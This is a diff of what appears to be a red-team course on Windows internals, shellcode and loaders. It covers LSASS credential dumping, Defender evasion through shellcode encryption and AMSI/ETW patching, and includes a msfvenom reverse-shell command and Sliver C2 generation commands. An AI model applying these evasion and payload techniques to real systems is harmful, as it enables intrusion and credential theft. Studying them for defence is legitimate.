+- *Virtual memory gives each process its own address space*
+- *Windows API is how we ask Windows to do things*
+- *DLLs are shared libraries containing reusable code*
+
+*Hands-on programs we wrote:*
+- *Create a process (start notepad)*
+- *List all processes*
+- *Create threads*
+- *Allocate memory with VirtualAlloc*
+- *Find function addresses with GetProcAddress*
+- *Load DLLs and call their functions*
+
+*Next portion: Shellcode and Code Injection*
+
+---
+
+# PART 6: SHELLCODE AND CODE INJECTION
+
+---
+
+# CHAPTER 26: What is Shellcode
+
+## Introduction
+
+You have heard the word "shellcode" many times. Now let us understand what it actually is.
+
+## Simple Definition
+
+Shellcode is **just bytes** that, when executed by the CPU, do something useful (for the attacker).
+
+That is it.
+
+It is not magic. It is not special. It is just machine code - the same bytes that any program becomes after compilation.
+
+## Why is it Called "Shellcode"?
+
+Historically, the goal of early exploit payloads was to spawn a shell (command prompt).
+
+If you got a shell, you could run any command. So the code that gave you a shell was called "shell code" → "shellcode".
+
+Today, shellcode does much more than spawn shells. But the name stuck.
+
+## What Makes Shellcode Different from a Normal Program?
+
+Normal program (EXE):
+- Has a PE header
+- Has sections (.text, .data, etc.)
+- Needs Windows to load it
+- Has imports that Windows resolves
+
+Shellcode:
+- **No headers** - Just raw bytes
+- **Position-independent** - Works no matter where in memory it is placed
+- **Self-contained** - Finds its own API addresses
+- **Usually small** - Just does one thing efficiently
+
+## Example: The Simplest Possible Shellcode
+
+Here is shellcode that does absolutely nothing (just returns):
+
+```
+C3
+```
+
+That is it. One byte. In assembly:
+
+```asm
+ret    ; Return to caller
+```
+
+If you execute this byte, the CPU will return from wherever it was called.
+
+## Example: Shellcode That Exits Cleanly
+
+This is still simple but does something:
+
+```
+31 C0    ; xor eax, eax     - Set EAX to 0 (exit code 0)
+50       ; push eax         - Push 0 on stack (uExitCode parameter)
+68 ?? ?? ?? ??  ; push address of ExitProcess
+C3       ; ret              - "Return" to ExitProcess
+```
+
+This exits the program with code 0. (The ?? ?? ?? ?? would be replaced with the actual address of ExitProcess)
+
+## What Sliver Shellcode Does
+
+When Sliver generates shellcode, it creates bytes that:
+
+1. Find the address of key functions (LoadLibrary, GetProcAddress)
+2. Load any DLLs it needs (like ws2_32.dll for networking)
+3. Create a network connection back to your C2 server
+4. Set up an encrypted communication channel
+5. Wait for commands and execute them
+
+All of this is packed into the shellcode bytes.
+
+## How Big is Shellcode?
+
+**Tiny shellcode:** 50-200 bytes
+- Simple tasks like spawning calc.exe or popping a message box
+
+**Medium shellcode:** 500-2000 bytes
+- Reverse shell, download and execute
+
+**Sliver shellcode:** 50,000+ bytes
+- Full implant with encryption, evasion, multiple protocols
+
+## Where Does Shellcode Come From?
+
+**Option 1: Generate with tools**
+- Sliver: `generate --mtls <ip>:<port> --format shellcode`
+- msfvenom: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=x.x.x.x LPORT=4444 -f c`
+- Cobalt Strike: Attacks → Packages → Windows Executable (S)
+
+**Option 2: Write it yourself**
+- Write in assembly
+- Assemble to bytes
+- This is for small, custom payloads
+
+---
+
+# CHAPTER 27: How Shellcode is Written
+
+## Introduction
+
+Let us understand how shellcode is actually created. This will help you understand what Sliver gives you.
+
+## The Challenge: Position Independence
+
+When you compile a normal program, addresses are fixed. The program says "call function at 0x00401234".
+
+But shellcode does not know where it will be placed in memory. Maybe at 0x00010000, maybe at 0x7FFE1234.
+
+If it uses fixed addresses, it will crash when placed somewhere else.
+
+**Solution:** Shellcode must find addresses at runtime.
+
+## Finding Kernel32.dll
+
+Almost all Windows shellcode needs functions from kernel32.dll.
+
+How does shellcode find kernel32.dll?
+
+**Method: Walk the PEB (Process Environment Block)**
+
+Every Windows process has a PEB structure. The PEB contains a list of loaded modules (DLLs).
+
+Shellcode walks this list to find kernel32.dll:
+
+```asm
+; Get PEB address (stored in GS register on x64)
+mov rax, gs:[0x60]           ; RAX = PEB address
+
+; Get PEB_LDR_DATA
+mov rax, [rax + 0x18]        ; RAX = PEB->Ldr
+
+; Get first module in list
+mov rax, [rax + 0x20]        ; RAX = InMemoryOrderModuleList
+
+; Walk list to find kernel32.dll
+; (skip ntdll, skip exe, find kernel32)
+mov rax, [rax]               ; Second entry
+mov rax, [rax]               ; Third entry (usually kernel32)
+mov rax, [rax + 0x20]        ; DllBase of kernel32
+```
+
+Now RAX contains the address where kernel32.dll is loaded!
+
+## Finding Functions: GetProcAddress
+
+Once we have kernel32.dll, we need to find functions like LoadLibrary and GetProcAddress.
+
+Shellcode reads kernel32.dll's export table:
+
+1. Find the PE header in kernel32
+2. Find the export directory
+3. Walk the list of exported function names
+4. Compare each name to "GetProcAddress"
+5. When found, get the function address
+
+This is complex, but it works no matter where kernel32 is loaded.
+
+## Example: Simple MessageBox Shellcode (Concept)
+
+Here is the logic (simplified):
+
+```
+1. Find kernel32.dll base address
+2. Find GetProcAddress function
+3. Use GetProcAddress to find LoadLibraryA
+4. LoadLibraryA("user32.dll") - now user32 is loaded
+5. GetProcAddress(user32, "MessageBoxA") - get MessageBoxA address
+6. Call MessageBoxA(NULL, "Hello", "Title", MB_OK)
+7. Exit or return
+```
+
+When assembled, this becomes something like:
+
+```
+\x48\x89\x5c\x24\x08\x48\x89\x6c\x24\x10\x48\x89\x74\x24\x18\x57
+\x48\x83\xec\x20\x65\x48\x8b\x04\x25\x60\x00\x00\x00\x48\x8b\x48
+... (many more bytes)
+```
+
+## Avoiding Bad Characters
+
+Some situations do not allow certain bytes in shellcode:
+
+**Null bytes (0x00):** Many string functions stop at 0x00
+**Newlines (0x0A, 0x0D):** HTTP headers cannot contain these
+**Other characters:** Depends on the vulnerability
+
+Shellcode writers use tricks to avoid these:
+- `xor eax, eax` instead of `mov eax, 0` (avoids 0x00000000)
+- Encoding/decoding stubs
+- Different instruction sequences that produce the same result
+
+## Hands-On: Look at msfvenom Shellcode
+
+On your Kali machine:
 
 ```bash
-ps aux | head -20
-```
-
-### Why Processes Matter for Attacks
-
-Your malware runs as a process. To evade detection:
-
-- You might inject into another process (look like Chrome instead of evil.exe)
-- Parent-child relationships are logged - spawning child processes leaves traces
-- Security tools monitor process creation events
-
----
-
-## 1.7: The LSASS Process - Why Attackers Target It
-
-### What is LSASS?
-
-**LSASS** = Local Security Authority Subsystem Service (`lsass.exe`)
-
-It's the Windows process responsible for:
-- User authentication (validating passwords)
-- Creating security tokens when users log in
-- Enforcing security policies
-
-### Why Attackers Care
-
-When a user logs in, LSASS:
-1. Receives their credentials
-2. Validates them against Active Directory
-3. **Caches credential data in memory** (for single sign-on)
-
-If you can read LSASS memory, you can extract:
-- NTLM password hashes
-- Kerberos tickets
-- Sometimes plaintext passwords
-
-**This is what Mimikatz does.**
-
-### HANDS-ON: Find LSASS
-
-```powershell
-Get-Process lsass | Format-List Id, ProcessName, WorkingSet64
+msfvenom -p windows/x64/messagebox TEXT="Hello" TITLE="Test" -f c
 ```
 
 Output:
-```
-Id            : 672
-ProcessName   : lsass
-WorkingSet64  : 17281024
-```
-
-That ~17 MB of RAM contains cached credentials.
-
-**But you can't just read it:**
-- Reading LSASS memory requires Administrator or SYSTEM privileges
-- Requires specific APIs (OpenProcess, ReadProcessMemory)
-- These operations are heavily monitored by security tools
-
----
-
-## 1.8: Summary - How This Connects to Attacks
-
-| Concept | Attack Relevance |
-|---------|------------------|
-| **CPU executes any bytes** | Shellcode = raw bytes we inject and run |
-| **RAM holds running code** | In-memory attacks avoid disk scanning |
-| **Disk is heavily scanned** | Files get caught by signature matching |
-| **User Mode is restricted** | We can't directly access other processes |
-| **Kernel Mode is powerful** | Defender runs here, watching us |
-| **Processes are isolated** | We need injection techniques to cross |
-| **LSASS has credentials** | High-value target for post-exploitation |
-
-### Interview Questions You Can Now Answer
-
-**Q: What is the difference between User Mode and Kernel Mode?**
-
-**A:** User Mode (Ring 3) is restricted - programs can only access their own memory and must make system calls to request privileged operations from the kernel. Kernel Mode (Ring 0) has full access to all memory, hardware, and can execute any CPU instruction. The separation exists so that buggy or malicious applications cannot crash the entire system or access other programs' data. Security tools like Windows Defender often run kernel drivers because they need unrestricted access to monitor everything.
-
-**Q: Why do attackers prefer in-memory execution?**
-
-**A:** Files on disk get scanned by antivirus at multiple points: when downloaded, when extracted, when executed. Code that exists only in memory never creates a file for signature scanning. Additionally, RAM is volatile - it's cleared when the system powers off, leaving fewer forensic artifacts. In-memory execution avoids file-based detection and reduces evidence.
-
-**Q: What is a process and why does isolation matter?**
-
-**A:** A process is a running instance of a program. Each process has its own isolated memory space, PID, security token, and handles. Isolation means one process cannot directly read another process's memory - this is enforced by the CPU's privilege levels. For attackers, this means we need techniques like process injection to execute code in another process's context.
-
----
-
-# PART 2: What is Windows Defender {#part-2-windows-defender}
-
-## 2.1: Definition
-
-**Windows Defender** is the built-in antimalware software in Windows 10 and Windows 11. Its official name is Microsoft Defender Antivirus.
-
-## 2.2: Components of Windows Defender
-
-Windows Defender consists of multiple components:
-
-### 2.2.1: MsMpEng.exe (Antimalware Service Executable)
-
-**What it is:** The main process that performs scanning
-
-**What it does:**
-- Scans files when they are created, opened, or executed
-- Performs periodic full system scans
-- Loads and uses signature databases
-
-### 2.2.2: Signature Database
-
-**What it is:** A database of patterns that identify known malware
-
-**What it does:**
-- Contains byte patterns (signatures) for known malware
-- When a file matches a signature, it is flagged as malicious
-- Updated regularly through Windows Update
-
-### 2.2.3: Cloud Protection
-
-**What it is:** Connection to Microsoft's cloud servers for threat intelligence
-
-**What it does:**
-- Sends file hashes and metadata to Microsoft for analysis
-- Receives information about new threats in real-time
-- Enables faster detection of new malware variants
-
-### 2.2.4: Behavior Monitoring
-
-**What it is:** Real-time monitoring of program actions
-
-**What it does:**
-- Watches what programs do (not just what they contain)
-- Detects suspicious behaviors like encrypting many files (ransomware)
-- Can terminate programs that exhibit malicious behavior
-
-### 2.2.5: AMSI (Antimalware Scan Interface)
-
-**What it is:** An interface that lets Windows scan script content before execution
-
-**What it does:**
-- Scans PowerShell commands before they execute
-- Scans .NET assemblies before they load
-- Detects malicious scripts even if they are not on disk
-
-We will cover AMSI in detail in Part 7.
-
-## 2.3: When Defender Scans
-
-**Static scanning (before execution):**
-1. When you download a file
-2. When you copy a file
-3. When you extract an archive
-4. When you double-click to execute
-
-**Runtime scanning (during execution):**
-1. When PowerShell executes a script (via AMSI)
-2. When .NET loads an assembly (via AMSI)
-3. When a program makes suspicious API calls
-
-**Behavioral scanning (after execution starts):**
-1. Continuous monitoring of file system changes
-2. Monitoring of network connections
-3. Monitoring of process creation
-
-## 2.4: How Defender Blocks Threats
-
-When Defender detects a threat:
-
-1. **Quarantine:** The file is moved to a secure location where it cannot execute
-2. **Block execution:** If the file is running, the process is terminated
-3. **Notification:** User is informed of the detection
-4. **Reporting:** Information is sent to Microsoft (if cloud protection is enabled)
-
-## 2.5: What "Bypass" Means
-
-When we say we will "bypass" Defender, we mean:
-
-1. We create a payload that does not match known signatures
-2. We disable or patch AMSI so runtime scanning fails
-3. We execute our code in a way that avoids triggering behavioral detection
-
-We are not disabling Defender. We are making our payload undetectable to its scanning methods.
-
----
-
-# PART 3: What are Windows APIs {#part-3-windows-apis}
-
-## 3.1: What is an API?
-
-**API** stands for **Application Programming Interface**. It's a set of functions that programs call to request services from the operating system.
-
-### Why APIs Exist
-
-Programs run in User Mode (Ring 3) and cannot directly access hardware or kernel resources. When a program needs to:
-- Read a file from disk
-- Allocate memory
-- Create a network connection
-- Start another program
-
-It must **ask the kernel** through an API call.
-
-### How an API Call Works
-
-```
-Your program                    Windows Kernel
------------                     --------------
-    |                               |
-    |  Call ReadFile()              |
-    |------------------------------>|
-    |                               |  Access disk hardware
-    |                               |  Read the data
-    |                               |
-    |  Return: data + success/fail  |
-    |<------------------------------|
-    |                               |
-```
-
-Your program never touches the disk directly. It calls the API, and the kernel does the work.
-
-### HANDS-ON: See API Calls in Action
-
-On Windows PowerShell, let's see what happens when we read a file:
-
-```powershell
-# Create a test file
-"Hello World" | Out-File -FilePath C:\temp\test.txt
-
-# Read it back
-Get-Content C:\temp\test.txt
-```
-
-Behind the scenes:
-1. PowerShell calls `CreateFile()` API to open the file
-2. PowerShell calls `ReadFile()` API to read the contents
-3. PowerShell calls `CloseHandle()` API to close the file
-
-Each call crosses from User Mode to Kernel Mode and back.
-
----
-
-## 3.2: Where Do APIs Live? (DLL Files)
-
-### What is a DLL?
-
-**DLL** stands for **Dynamic Link Library**. A DLL is a file containing compiled code (functions) that programs can use.
-
-Instead of every program containing its own code for reading files, allocating memory, etc., Windows provides DLLs with this code pre-written. Programs just call functions in the DLLs.
-
-### The Main Windows DLLs
-
-| DLL File | What's inside | Why it matters for attacks |
-|----------|--------------|----------------------------|
-| **kernel32.dll** | Core Win32 functions: files, memory, processes | Most APIs we use (VirtualAlloc, CreateThread) |
-| **ntdll.dll** | Native API layer, system calls | This is where AMSI/ETW patches happen |
-| **user32.dll** | GUI functions: windows, buttons, messages | Not used in our attack |
-| **advapi32.dll** | Security, registry, services | Used for privilege operations |
-| **amsi.dll** | AMSI scanning functions | We will patch this to bypass script scanning |
-
-### How Programs Use DLLs
-
-When a program starts:
-
-1. Windows' loader reads the program's import table
-2. Loader finds which DLLs the program needs
-3. Loader maps those DLLs into the process's memory
-4. Program can now call functions in those DLLs
-
-### HANDS-ON: See DLLs Loaded in a Process
-
-**On Windows PowerShell:**
-
-```powershell
-# Start Notepad
-Start-Process notepad
-Start-Sleep -Seconds 2
-
-# Get the process
-$proc = Get-Process notepad
-
-# See all loaded modules (DLLs)
-$proc.Modules | Select-Object ModuleName, FileName | Format-Table -AutoSize
-```
-
-**Output:**
-
-```
-ModuleName           FileName
-----------           --------
-notepad.exe          C:\Windows\System32\notepad.exe
-ntdll.dll            C:\Windows\System32\ntdll.dll
-KERNEL32.DLL         C:\Windows\System32\KERNEL32.DLL
-KERNELBASE.dll       C:\Windows\System32\KERNELBASE.dll
-GDI32.dll            C:\Windows\System32\GDI32.dll
-win32u.dll           C:\Windows\System32\win32u.dll
+```c
+unsigned char buf[] = 
+"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
+"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
 ...
 ```
 
-You can see Notepad has loaded `ntdll.dll`, `KERNEL32.DLL`, and many others. Each DLL provides functions that Notepad uses.
+Each `\xfc` is one byte. This is shellcode that will pop a message box.
 
-```powershell
-# Count how many DLLs are loaded
-$proc.Modules.Count
-```
+---
 
-Probably 60-100+ DLLs!
+# CHAPTER 28: What is a Shellcode Loader
 
-### For Our Malware
+## Introduction
 
-**The attack flow using DLLs:**
+Shellcode is just bytes. It cannot run by itself like an .exe file.
 
-We will:
-1. Load `amsi.dll` using `LoadLibrary()` - Get AMSI's code into our memory
-2. Find `AmsiScanBuffer` function using `GetProcAddress()` - Get exact address
-3. Modify that function's code to disable AMSI scanning - Replace its instructions
+You need a **loader** - a program that:
+1. Puts the shellcode in memory
+2. Makes that memory executable
+3. Jumps to the shellcode (runs it)
 
-**Why does this work?**
+## The Simplest Loader
 
-When a DLL is loaded into your process, it becomes part of YOUR memory space. You can read it, and with the right permissions (VirtualProtect), you can WRITE to it.
-
-This is the fundamental weakness we exploit: security DLLs run in the same process as the attacker's code.
-
-## 3.3: The Specific APIs We Will Use
-
-Now let me explain each API function we will use in our loader. Understanding these is critical because:
-1. They are asked in interviews all the time
-2. You need to understand them to modify and improve the loader
-3. They are the building blocks of ALL Windows shellcode loaders
-
-**Quick reference table:**
-
-| API Function | Purpose in our attack | DLL |
-|--------------|----------------------|-----|
-| `LoadLibrary` | Load amsi.dll/ntdll.dll so we can patch them | kernel32.dll |
-| `GetProcAddress` | Find exact address of functions to patch | kernel32.dll |
-| `VirtualAlloc` | Allocate executable memory for shellcode | kernel32.dll |
-| `VirtualProtect` | Change memory permissions (make writable) | kernel32.dll |
-| `Marshal.Copy` | Copy bytes (our patch/shellcode) to memory | .NET Framework |
-| `CreateThread` | Start executing our shellcode | kernel32.dll |
-| `WaitForSingleObject` | Wait for shellcode to finish | kernel32.dll |
-
-### LoadLibrary
-
-**What it does:** Loads a DLL file into your program's memory
-
-**Simpler:** "Windows, I want to use amsi.dll. Load it into my process so I can access its functions."
-
-**Technical signature:**
 ```c
-HMODULE LoadLibrary(
-    LPCSTR lpLibFileName    // Name of the DLL to load
-);
-```
-
-**Parameters:**
-- `lpLibFileName`: The name of the DLL file. Example: "amsi.dll" or "kernel32.dll"
-
-**Return value:**
-- **Success:** A "handle" (a number identifying the loaded DLL)
-- **Failure:** NULL (which equals 0)
-
-**Why we use it in our attack:**
-We need to load amsi.dll so we can find and patch the AmsiScanBuffer function to disable AMSI scanning.
-
-### GetProcAddress
-
-**What it does:** Finds where a specific function is located in memory
-
-**Simpler:** "Now that amsi.dll is loaded, tell me the exact memory address of the AmsiScanBuffer function."
-
-**Technical signature:**
-```c
-FARPROC GetProcAddress(
-    HMODULE hModule,        // Handle to the DLL (from LoadLibrary)
-    LPCSTR  lpProcName      // Name of the function to find
-);
-```
-
-**Parameters:**
-- `hModule`: The handle we got from LoadLibrary
-- `lpProcName`: The name of the function we want. Example: "AmsiScanBuffer"
-
-**Return value:**
-- **Success:** The memory address where the function starts
-- **Failure:** NULL (0)
-
-**Why we use it in our attack:**
-We need to know exactly where AmsiScanBuffer is located so we can overwrite its code with our patch.
-
-### VirtualAlloc
-
-**What it does:** Asks Windows to give you some RAM to use
-
-**In plain English:** "Hey Windows, I need [X] bytes of memory. Also, I want to be able to write to it AND execute it as code."
-
-**Technical signature:**
-```c
-LPVOID VirtualAlloc(
-    LPVOID lpAddress,           // Where to put the memory (NULL = let Windows decide)
-    SIZE_T dwSize,              // How many bytes you need
-    DWORD  flAllocationType,    // How to allocate (we use 0x3000)
-    DWORD  flProtect            // What can we do with this memory
-);
-```
-
-**Parameters in plain English:**
-
-| Parameter | What it means | What we use |
-|-----------|--------------|-------------|
-| lpAddress | Where you want the memory. NULL means "anywhere is fine" | NULL |
-| dwSize | How many bytes you need | Size of our shellcode |
-| flAllocationType | Reserve and/or commit the memory | 0x3000 (do both) |
-| flProtect | What operations are allowed | 0x40 (read + write + execute) |
-
-**The crucial parameter - flProtect:**
-
-This controls what you can do with the memory:
-
-| Value | Name | What it means |
-|-------|------|---------------|
-| 0x02 | PAGE_READONLY | Can only read - can't write or run |
-| 0x04 | PAGE_READWRITE | Can read and write - but can't run as code |
-| 0x20 | PAGE_EXECUTE_READ | Can read and run - but can't write |
-| 0x40 | PAGE_EXECUTE_READWRITE | Can read, write, AND run as code |
-
-**Why we need 0x40 (PAGE_EXECUTE_READWRITE):**
-
-Our shellcode is data that we want to execute as code:
-1. We need to WRITE our shellcode bytes into this memory
-2. We need to EXECUTE those bytes as CPU instructions
-
-This is suspicious because legitimate programs rarely need this. Security products flag it.
-
-**Return value:**
-- **Success:** The address of the memory Windows gave us
-- **Failure:** NULL (0)
-
-### VirtualProtect
-
-**What it does:** Changes what you can do with a section of memory
-
-**In plain English:** "Hey Windows, I want to change the rules for this memory region. Make it writable so I can modify the code there."
-
-**Technical signature:**
-```c
-BOOL VirtualProtect(
-    LPVOID lpAddress,           // Starting address of the memory
-    SIZE_T dwSize,              // How many bytes to change
-    DWORD  flNewProtect,        // New permissions (0x40 for read/write/execute)
-    PDWORD lpflOldProtect       // Stores the old permissions (required)
-);
-```
-
-**Why we need this:**
-
-The code inside DLLs (like amsi.dll) is marked as PAGE_EXECUTE_READ - you can run it, but you can't modify it.
-
-We NEED to modify it to patch AMSI. So the flow is:
-1. Find AmsiScanBuffer's address
-2. Call VirtualProtect to make it writable
-3. Write our patch bytes
-4. AMSI is now disabled
-
-**Return value:**
-- **Success:** Non-zero (TRUE)
-- **Failure:** Zero (FALSE)
-
-### CreateThread
-
-**What it does:** Starts a new path of execution in your program
-
-**In plain English:** "Hey Windows, create a new worker thread and have it start running code at this address."
-
-**Why this is the key to shellcode execution:**
-
-After we've:
-1. Allocated memory with execute permission
-2. Copied our shellcode into that memory
-
-We need to actually RUN it. CreateThread creates a new thread that starts executing at the address we specify - which is our shellcode.
-
-**Technical signature:**
-```c
-HANDLE CreateThread(
-    LPSECURITY_ATTRIBUTES   lpThreadAttributes,     // NULL = default security
-    SIZE_T                  dwStackSize,            // 0 = default stack size
-    LPTHREAD_START_ROUTINE  lpStartAddress,         // WHERE TO START EXECUTING
-    LPVOID                  lpParameter,            // NULL = no parameters
-    DWORD                   dwCreationFlags,        // 0 = start immediately
-    LPDWORD                 lpThreadId              // NULL = we don't need the ID
-);
-```
-
-**The critical parameter: lpStartAddress**
-
-This is the memory address where the new thread will start executing. We set this to the address where we put our shellcode.
-
-When the thread starts:
-1. CPU sets its instruction pointer to lpStartAddress
-2. CPU reads bytes at that address and executes them
-3. Our shellcode runs
-4. Shellcode connects to our C2 server
-5. We have a shell!
-
-**Return value:**
-- **Success:** Handle to the new thread
-- **Failure:** NULL (0)
-
-### WaitForSingleObject
-
-**What it does:** Pauses the current thread until something finishes
-
-**In plain English:** "Hey Windows, don't let my main program exit. Wait here until the shellcode thread is done."
-
-**Why we need this:**
-
-After CreateThread, our main program would immediately exit. When the main program exits, Windows terminates the entire process including our shellcode thread.
-
-WaitForSingleObject keeps the main thread alive (just waiting) while the shellcode thread runs.
-
-**Technical signature:**
-```c
-DWORD WaitForSingleObject(
-    HANDLE hHandle,         // Handle to the thread (from CreateThread)
-    DWORD  dwMilliseconds   // How long to wait (0xFFFFFFFF = forever)
-);
-```
-
-**We use INFINITE (0xFFFFFFFF)** because our shellcode (C2 beacon) runs indefinitely. We want our loader to wait forever.
-
----
-
-# PART 4: Memory Management {#part-4-memory-management}
-
-## 4.1: Virtual Memory
-
-**Definition:** Virtual memory is an abstraction layer that gives each process its own isolated address space.
-
-**What this means:**
-
-Each process thinks it has access to the entire address range (0 to maximum address). In reality, the OS maps these virtual addresses to physical RAM locations.
-
-**Example:**
-- Process A accesses virtual address 0x10000
-- Process B also accesses virtual address 0x10000
-- These are DIFFERENT physical RAM locations
-- The OS maintains separate mappings for each process
-
-**Why this exists:**
-1. **Isolation:** One process cannot read another process's memory
-2. **Simplicity:** Each process can use any address without coordinating with other processes
-3. **Security:** A bug in one process cannot corrupt another process
-
-## 4.2: Address Space Layout
-
-A Windows process has a defined address space layout:
-
-```
-PROCESS ADDRESS SPACE (64-bit):
--------------------------------
-
-0x00000000'00000000 +---------------------------+
-                    | NULL pointer guard        | Invalid region
-0x00000000'00010000 +---------------------------+
-                    | Process executable (.exe) | Code and data of main program
-                    +---------------------------+
-                    | Loaded DLLs               | kernel32.dll, ntdll.dll, etc.
-                    +---------------------------+
-                    | Heap                      | Dynamic allocations (VirtualAlloc)
-                    +---------------------------+
-                    | Stack                     | Function call stack
-                    +---------------------------+
-                    | (more heap/loaded DLLs)   |
-0x00007FFF'FFFFFFFF +---------------------------+
-                    | Kernel space              | Not accessible from user mode
-0xFFFFFFFF'FFFFFFFF +---------------------------+
-```
-
-## 4.3: Memory Protection
-
-Each region of memory has protection attributes that define what operations are allowed.
-
-**Protection values:**
-
-| Value | Name | Can Read | Can Write | Can Execute |
-|-------|------|----------|-----------|-------------|
-| 0x01 | PAGE_NOACCESS | No | No | No |
-| 0x02 | PAGE_READONLY | Yes | No | No |
-| 0x04 | PAGE_READWRITE | Yes | Yes | No |
-| 0x10 | PAGE_EXECUTE | No | No | Yes |
-| 0x20 | PAGE_EXECUTE_READ | Yes | No | Yes |
-| 0x40 | PAGE_EXECUTE_READWRITE | Yes | Yes | Yes |
-
-**DEP (Data Execution Prevention):**
-
-Modern Windows enables DEP by default. DEP enforces that:
-- Memory marked as data (PAGE_READWRITE) cannot be executed
-- Memory marked as code (PAGE_EXECUTE_READ) cannot be modified
-
-This prevents attacks where data gets interpreted as code. To run shellcode, we must explicitly allocate memory with execute permission.
-
-## 4.4: Why RWX Memory is Suspicious
-
-Legitimate programs follow this pattern:
-- Code sections: PAGE_EXECUTE_READ (run but not modify)
-- Data sections: PAGE_READWRITE (read/write but not run)
-
-Shellcode requires PAGE_EXECUTE_READWRITE because:
-1. We write shellcode bytes into memory (requires write)
-2. We execute those bytes (requires execute)
-
-Security products monitor for VirtualAlloc with PAGE_EXECUTE_READWRITE (0x40) because:
-- It is uncommon in legitimate software
-- It is almost always used by malware loaders
-- It indicates code injection or dynamic code generation
-
----
-
-# PART 5: Processes and Threads {#part-5-processes-threads}
-
-## 5.1: What is a Process
-
-**Definition:** A process is an instance of a running program.
-
-**Components of a process:**
-- **Virtual address space:** Private memory accessible only to this process
-- **Executable code:** The instructions that run
-- **Handles:** References to OS objects (files, registry keys, threads)
-- **Security context:** The user account and permissions the process runs under
-- **At least one thread:** The actual execution path
-
-When you run notepad.exe:
-1. Windows creates a new process
-2. Notepad's code is loaded into the process's address space
-3. Required DLLs are loaded
-4. A thread is created to start executing notepad's code
-
-## 5.2: What is a Thread
-
-**Definition:** A thread is a path of execution within a process.
-
-A process can have multiple threads. All threads in a process share:
-- The same virtual address space
-- The same handles
-- The same code
-
-Each thread has its own:
-- Stack (for function calls and local variables)
-- Registers (including instruction pointer)
-- Thread-local storage
-
-**Multiple threads:**
-
-Modern programs use multiple threads for parallelism:
-- Chrome uses threads for each tab
-- A game might use threads for graphics, audio, and physics
-- A malware loader can create a thread to run shellcode
-
-## 5.3: Thread Execution
-
-Each thread has an **Instruction Pointer (IP)** register that points to the next instruction to execute.
-
-**Execution cycle:**
-1. CPU reads instruction at address pointed to by IP
-2. CPU executes that instruction
-3. IP advances to next instruction
-4. Repeat
-
-When we create a thread for shellcode:
-1. We tell CreateThread to start at our shellcode address
-2. Windows creates a new thread with IP set to that address
-3. CPU starts executing bytes at that address as instructions
-4. Our shellcode runs
-
-## 5.4: Process Creation and Defender Scanning
-
-When you double-click an .exe:
-
-```
-1. Explorer.exe calls CreateProcess()
-       |
-       v
-2. Kernel creates process object
-       |
-       v
-3. Kernel loads .exe into memory
-       |
-       v
-4. DEFENDER SCANS THE FILE <-- Static scan happens here
-       |
-       v
-5. If clean: Kernel loads required DLLs
-       |
-       v
-6. Kernel creates initial thread
-       |
-       v
-7. Thread starts executing at entry point
-```
-
-Defender scans the file BEFORE code execution begins. This is static scanning. If the file contains known malware signatures, execution is blocked.
-
-This is why we encrypt our shellcode. Encrypted bytes do not match signatures.
-
----
-
-# PART 6: How Malware Gets Detected {#part-6-detection}
-
-Now that we understand how computers work, let's understand how they catch malware. Once you understand detection, you can understand evasion.
-
-## 6.1: The Three Stages of Detection
-
-Security products try to catch malware at three stages:
-
-| Stage | When it happens | What's checked | Our counter |
-|-------|----------------|----------------|-------------|
-| **Static** | Before code runs | File signatures, patterns, structure | Encrypt shellcode |
-| **Runtime** | While code runs | Script content, API calls | Patch AMSI/ETW |
-| **Behavioral** | After code runs | What the program actually does | Blend with normal behavior |
-
-Let's understand each stage.
-
-## 6.2: Static Detection - Catching Files Before They Run
-
-**What is it?**
-
-Static detection looks at a file BEFORE it executes. It analyzes the bytes of the file itself.
-
-**Methods used:**
-
-**Signature matching:**
-Security products have databases of known malware "signatures" - specific byte patterns.
-
-Example: If the bytes `DE AD BE EF CA FE` appear in a file, and those bytes are known to be from Mimikatz, the file is flagged.
-
-**In plain English:** It's like having mugshots of known criminals. If someone matches a mugshot, they're caught.
-
-**Heuristic analysis:**
-Beyond exact matches, static analysis looks for suspicious characteristics:
-- Strange section names in executables
-- Suspicious API imports (like VirtualAlloc + CreateThread together)
-- Signs of packing or encryption
-
-**Machine learning:**
-AI models trained on millions of samples can predict whether a file is malicious based on structure and characteristics.
-
-**Why encryption defeats static detection:**
-
-If we encrypt our shellcode, the bytes in the file are scrambled. They don't match any known signatures because they're random-looking data, not recognizable malware.
-
-```
-ORIGINAL SHELLCODE:     48 89 5C 24 08 (known malicious pattern)
-ENCRYPTED (XOR 0x35):   7D BC 69 11 3D (random-looking bytes)
-```
-
-Defender sees `7D BC 69 11 3D` and finds no matching signatures. Static detection passes.
-
-## 6.3: Runtime Detection - Catching Code While It Runs
-
-**What is it?**
-
-Even if a file passes static detection, security products watch what it DOES when it runs.
-
-**The problem static detection can't solve:**
-
-What if malicious code is:
-- Typed directly into PowerShell (never saved to disk)?
-- Downloaded and executed in memory only?
-- Hidden inside a legitimate-looking document?
-
-These "fileless" attacks bypass file-based scanning. That's why runtime detection exists.
-
-**Key runtime detection technologies:**
-
-| Technology | What it does | We must defeat it |
-|------------|-------------|-------------------|
-| **AMSI** | Scans script content before execution | Yes - we patch it |
-| **ETW** | Logs what programs do for later analysis | Yes - we patch it |
-| **API Hooking** | Intercepts suspicious API calls | Sometimes |
-
-We'll cover AMSI and ETW in detail in the next sections.
-
-## 6.4: Behavioral Detection - Catching Malware by Actions
-
-**What is it?**
-
-Even if malware passes static and runtime detection, security products watch what programs actually DO and flag suspicious behavior.
-
-**Examples of suspicious behavior:**
-
-- Encrypting many files rapidly (ransomware)
-- Accessing LSASS process (credential theft)
-- Creating hidden scheduled tasks (persistence)
-- Connecting to known-bad IP addresses
-- Spawning PowerShell from Office applications
-
-**In plain English:** Even if we don't recognize the criminal, we recognize criminal behavior.
-
-**Why this is harder to bypass:**
-
-Behavioral detection doesn't care about signatures or encryption. It watches actions. If your malware acts malicious, it gets caught.
-
-**Our approach:**
-
-We try to:
-- Blend with normal activity
-- Execute slowly (not as suspicious as rapid activity)
-- Use legitimate tools when possible (living off the land)
-- Avoid known-bad patterns
-
----
-
-# PART 7: What is AMSI {#part-7-amsi}
-
-AMSI is one of the most important security features we need to bypass. Let's understand it completely.
-
-## 7.1: What Problem AMSI Solves
-
-**The old days (before 2015):**
-
-Antivirus scanned files on disk. If malware was saved to the hard drive, antivirus could detect it.
-
-**The problem:**
-
-Attackers learned to avoid the hard drive entirely:
